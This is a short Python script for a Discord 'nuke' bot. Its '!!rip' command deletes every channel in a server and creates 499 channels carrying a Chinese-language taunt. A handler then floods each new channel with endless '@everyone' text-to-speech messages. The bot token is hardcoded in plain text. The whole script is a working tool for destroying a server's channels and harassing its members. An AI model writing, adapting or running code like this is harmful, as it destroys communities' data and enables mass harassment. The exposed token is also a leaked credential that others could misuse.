import discord
from discord.ext import commands

bot = commands.Bot(command_prefix='!!') 
@bot.command()
async def rip(ctx):
        for channel in ctx.guild.channels:
          await channel.delete()
        for i in range(1, 500):
            await ctx.guild.create_text_channel("粉紅胖子再亂踢阿")

@bot.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send("@everyone 粉紅胖子再亂踢阿", tts=True)

bot.run('NzgzMjYwMjM3NjQ5MjgxMDY0.X8YJ8A.bopHoD3S4NLBH2NJvJAmS8HfXjk')